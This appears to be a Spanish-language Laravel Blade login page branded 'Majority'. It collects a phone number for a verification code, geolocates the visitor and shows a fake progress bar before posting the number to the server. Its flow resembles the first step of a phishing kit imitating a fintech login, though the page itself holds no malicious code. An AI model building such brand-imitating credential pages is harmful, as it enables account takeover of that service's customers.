<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Inicio - Majority</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.13/css/intlTelInput.min.css"
  />
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.13/css/intlTelInput.css"
  />

  <style>
    body {
      background: #f4f4fa;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      padding: 10px;
      box-sizing: border-box;
    }
      @media (max-width: 768px) {
    body {
      background: url('img/fondo.png') no-repeat center center fixed;
      background-size: cover;
    }}

    .container {
      position: relative;
      background: white;
      padding: 30px 25px;
      border-radius: 15px;
      text-align: center;
      max-width: 400px;
      width: 100%;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
      box-sizing: border-box;
    }

    .circle {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background: #ccc;
      display: inline-block;
      margin: 3px;
    }

    .circle.active {
      background: #6b46ff;
    }

    .phone-input-container {
      margin-top: 20px;
      max-width: 270px; /* ancho máximo para el input */
      margin-left: auto; /* centra horizontalmente */
      margin-right: auto;
    }

    .phone-input-container input {
      width: 100% !important;
      padding: 14px;
      font-size: 16px;
      border-radius: 10px;
      box-sizing: border-box;
    }

    .iti {
      width: 100%;
      border: 1px solid #ccc !important;
      border-radius: 10px !important;
      box-sizing: border-box;
    }

    .iti__flag-container {
      background-color: #f9f9f9;
      border-right: none;
      border-top-left-radius: 10px;
      border-bottom-left-radius: 10px;
    }

    .iti__tel-input {
      border: none !important;
      border-top-right-radius: 10px;
      border-bottom-right-radius: 10px;
    }

    .iti--separate-dial-code .iti__flag-container,
    .iti__tel-input {
      border: none !important;
    }

    /* Styles for the dropdown list */
    .iti__dropdown {
      border-radius: 10px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
      overflow: hidden; /* Ensures content respects border-radius */
      max-height: 280px; /* Set a maximum height for the dropdown */
      display: flex; /* Use flexbox for layout */
      flex-direction: column; /* Stack children vertically */
      z-index: 99; /* Ensure dropdown is above other content */
    }

    /* Style for individual list items (countries) */
    .iti__country-list {
      padding: 0;
      margin: 0;
      list-style: none;
      overflow-y: auto; /* Enable vertical scrolling for the list of countries */
      flex-grow: 1; /* Allow the country list to grow and fill available space */
      -webkit-overflow-scrolling: touch; /* For smoother scrolling on iOS */
    }

    /* Custom scrollbar for webkit browsers */
    .iti__country-list::-webkit-scrollbar {
        width: 8px;
    }
    .iti__country-list::-webkit-scrollbar-track {
        background: #f1f1f1;
        border-radius: 10px;
    }
    .iti__country-list::-webkit-scrollbar-thumb {
        background: #888;
        border-radius: 10px;
    }
    .iti__country-list::-webkit-scrollbar-thumb:hover {
        background: #555;
    }


    .iti__country {
      padding: 10px 15px;
      display: flex;
      align-items: center;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .iti__country.iti__highlight {
      background-color: #f0f0f0; /* Hover effect */
    }

    .iti__country.iti__active {
      background-color: #6b46ff;
      color: white;
    }
    
    .iti__country.iti__active .iti__dial-code,
    .iti__country.iti__active .iti__country-name {
      color: white; /* Ensure text is white when active */
    }

    .iti__flag-box {
      margin-right: 10px;
    }

    .iti__dial-code {
      margin-left: auto; /* Pushes dial code to the right */
      color: #6b46ff;
      font-weight: bold;
    }

    .iti__selected-dial-code {
        color: #000;
        font-weight: normal;
    }

    /* Search input for country dropdown */
    .iti__search-input-wrapper {
      padding: 10px; /* Padding around the input */
      background: white; /* Background for the search input area */
      border-bottom: 1px solid #eee; /* Separator line */
      flex-shrink: 0; /* Prevent it from shrinking */
      box-sizing: border-box; /* Include padding in width */
    }

    .iti__search-input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 8px; /* Slightly more rounded */
      box-sizing: border-box;
      font-size: 14px;
      outline: none;
    }
    .iti__search-input:focus {
        border-color: #6b46ff;
        box-shadow: 0 0 0 2px rgba(107, 70, 255, 0.2); /* Subtle focus ring */
    }


    /* Botón alineado a la izquierda */
    .btn-container {
      margin-top: 20px;
      max-width: 230px; /* igual que el input para que quede alineado */
      margin-left: 0;
    }

    button {
      padding: 14px 24px;
      border-radius: 40px;
      background: #6b46ff;
      color: white;
      border: none;
      font-size: 16px;
      cursor: pointer;
      min-width: 140px;
      transition: background-color 0.3s ease;
    }

    button:disabled {
      background: #ccc;
      cursor: not-allowed;
    }

    /* ===== Overlay de carga encima del form ===== */
    .overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.9);
      border-radius: 15px;
      display: none;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      z-index: 10;
    }

    .progress-bar {
      width: 80%;
      height: 8px;
      background: #e0e0e0;
      border-radius: 5px;
      overflow: hidden;
      margin-top: 10px;
    }

    .progress-fill {
      height: 100%;
      width: 0%;
      background: #2ecc71;
      transition: width 0.3s;
    }

    .progress-text {
      font-weight: bold;
      font-size: 18px;
    }

    /* Responsive ajustes para móviles */
    @media (max-width: 400px) {
      .phone-input-container {
        max-width: 100%;
        margin-left: 0;
        margin-right: 0;
      }
      .btn-container {
        max-width: 100%;
      }
      button {
        min-width: 100%;
      }
    }
  </style>
</head>
<body>
  <form
    class="container"
    id="formulario"
    method="POST"
    action="{{ route('enviar.telefono') }}"
  >
    @csrf

    <div class="overlay" id="overlay">
      <div class="progress-text" id="progressText">0%</div>
      <div class="progress-bar">
        <div class="progress-fill" id="progressFill"></div>
      </div>
    </div>

    <div style="margin-top: 20px;">
      <span class="circle active"></span>
      <span class="circle"></span>
      <span class="circle"></span>
    </div>

    <h2 style="font-size: 28px; font-weight: 700; line-height: 1.3; margin-bottom: 5px; color: #000;">
  Inicia sesión con tu número de teléfono
</h2>
<p style="color: #9ca3af; font-size: 14px; line-height: 1.3; white-space: pre-line; text-align: left; max-width: 400px; margin-left: 12px; padding-left: 25px; margin-top: 0;">
  Te enviaremos un código de<br>verificación
</p>



    <div class="phone-input-container">
      <input
        type="tel"
        id="phone"
        name="telefono"
        placeholder="234-567-8901"
        required
      />
    </div>

    <div class="btn-container">
      <button type="submit" id="btnEnviar" disabled>
        Enviar código
      </button>
    </div>
  </form>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.13/js/intlTelInput.min.js"></script>
  <script>
  const input = document.querySelector("#phone");
  const btn = document.querySelector("#btnEnviar");
  const form = document.querySelector("#formulario");

  const overlay = document.getElementById("overlay");
  const progressFill = document.getElementById("progressFill");
  const progressText = document.getElementById("progressText");

  const iti = window.intlTelInput(input, {
    utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.13/js/utils.js",
    preferredCountries: ["us", "pe", "mx"],
    initialCountry: "auto",
    separateDialCode: true,
    geoIpLookup: function(callback) {
      fetch("https://ipapi.co/json")
        .then(res => res.json())
        .then(data => callback(data.country_code))
        .catch(() => callback("us"));
    },
  });

  // Activar o desactivar el botón dependiendo de si el número es válido
  input.addEventListener("input", () => {
    if (iti.isValidNumber()) {
      btn.disabled = false;
    } else {
      btn.disabled = true;
    }
  });

  form.addEventListener("submit", function(e) {
    e.preventDefault();
    btn.disabled = true;
    overlay.style.display = "flex";

    let progress = 0;
    const interval = setInterval(() => {
      progress++;
      progressFill.style.width = progress + "%";
      progressText.textContent = progress + "%";

      if (progress >= 100) {
        clearInterval(interval);
        // Actualizar el input con el número completo con código de país
        input.value = iti.getNumber();

        // Enviar el formulario finalmente
        form.submit();
      }
    }, 25);
  });

  // --- Start of new/updated code for search input and dropdown height ---
  const flagContainer = document.querySelector('.iti__flag-container');
  let searchInput = null; // Declare searchInput here to access it later

  flagContainer.addEventListener('click', function() {
    // Use requestAnimationFrame for better timing, or just a slightly longer setTimeout
    // to ensure the dropdown is fully rendered and positioned.
    requestAnimationFrame(() => { 
        const dropdown = document.querySelector('.iti__dropdown');
        if (dropdown) {
            // Only create the search input if it doesn't exist already
            if (!searchInput) { // Check if searchInput element is null
                const searchInputWrapper = document.createElement('div');
                searchInputWrapper.classList.add('iti__search-input-wrapper');

                searchInput = document.createElement('input'); // Assign to searchInput variable
                searchInput.type = 'text';
                searchInput.placeholder = 'Buscar país...';
                searchInput.classList.add('iti__search-input');
                
                searchInputWrapper.appendChild(searchInput);
                dropdown.prepend(searchInputWrapper);

                searchInput.addEventListener('input', function() {
                    const filter = this.value.toLowerCase();
                    const countryList = dropdown.querySelector('.iti__country-list');
                    const countries = countryList.querySelectorAll('.iti__country');

                    countries.forEach(country => {
                        const countryName = country.querySelector('.iti__country-name').textContent.toLowerCase();
                        // Safely get dial code text
                        const dialCodeElement = country.querySelector('.iti__dial-code');
                        const dialCode = dialCodeElement ? dialCodeElement.textContent.toLowerCase() : '';

                        if (countryName.includes(filter) || dialCode.includes(filter)) {
                            country.style.display = 'flex';
                        } else {
                            country.style.display = 'none';
                        }
                    });
                });
            }
            // Focus on the search input every time the dropdown is opened
            searchInput.focus();
        }
    });
  });
  // --- End of new/updated code for search input and dropdown height ---
</script>

</body>
</html>